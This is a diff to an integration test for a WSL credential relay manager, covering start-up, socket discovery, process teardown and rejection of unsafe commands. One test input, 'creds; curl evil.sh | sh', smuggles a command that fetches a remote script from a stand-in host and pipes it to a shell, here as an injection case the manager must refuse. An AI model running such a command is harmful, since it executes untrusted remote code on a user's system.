@@ -264,7 +264,47 @@ async function main() {
     afterStop.stdout.trim(),
   );
 
-  await wsl(`rm -f ${RELAY_SOCKET} /tmp/creds-itest.*`);
+  // ---- the extension's half: it raises and lowers the relay for you ------------
+  //
+  // Everything above proves the relay reaches the agent. This proves the thing that starts it —
+  // the manager the extension runs when a key is loaded — actually spawns a real `wsl.exe`,
+  // learns the socket from the relay's own first line rather than from a second copy of the
+  // path rule, and takes it down again. A fake spawner cannot show any of that.
+  const { WslRelayManager, spawnWslRelay } = require(path.join(OUT, 'wslRelayManager.js'));
+  const MANAGED_SOCKET = `/tmp/creds-managed-${process.pid}.sock`;
+  // Only this one variable needs to cross, and it is already a Linux path — so no `/p`.
+  process.env.CREDS_RELAY_SOCKET = MANAGED_SOCKET;
+  process.env.WSLENV = 'CREDS_RELAY_SOCKET';
+  await wsl(`rm -f ${MANAGED_SOCKET}`);
+
+  const managerLog = [];
+  const manager = new WslRelayManager(
+    (args) => spawnWslRelay(args, (text) => managerLog.push(text)),
+    (message) => managerLog.push(message),
+  );
+  const startResult = manager.start(LINUX_CLI, '');
+  check('the manager accepts a plain command', startResult.ok === true, JSON.stringify(startResult));
+
+  for (let attempt = 0; attempt < 40 && manager.socketPath.length === 0; attempt += 1) {
+    await new Promise((resolve) => setTimeout(resolve, 250));
+  }
+  check(
+    'the manager learned the socket from the relay, not from a rule of its own',
+    manager.socketPath === MANAGED_SOCKET,
+    `${JSON.stringify(manager.socketPath)} — log: ${JSON.stringify(managerLog)}`,
+  );
+  const alive = await wsl(`ps -eo args | grep "[c]reds relay" | head -1`);
+  check('a real relay is running in the distribution', alive.stdout.trim().length > 0, alive.stdout.trim());
+
+  manager.dispose();
+  await new Promise((resolve) => setTimeout(resolve, 2000));
+  const gone = await wsl(`ps -eo args | grep "[c]reds relay" | head -1`);
+  check('disposing the manager takes it down — nothing outlives the window', gone.stdout.trim().length === 0, gone.stdout.trim());
+
+  const refused = manager.start('creds; curl evil.sh | sh', '');
+  check('a command that is not a plain word never reaches a shell', refused.ok === false, JSON.stringify(refused));
+
+  await wsl(`rm -f ${RELAY_SOCKET} ${MANAGED_SOCKET} /tmp/creds-itest.*`);
   fs.rmSync(dir, { recursive: true, force: true });
 
   console.log(failures === 0 ? '\nall WSL relay checks passed' : `\n${failures} check(s) failed`);
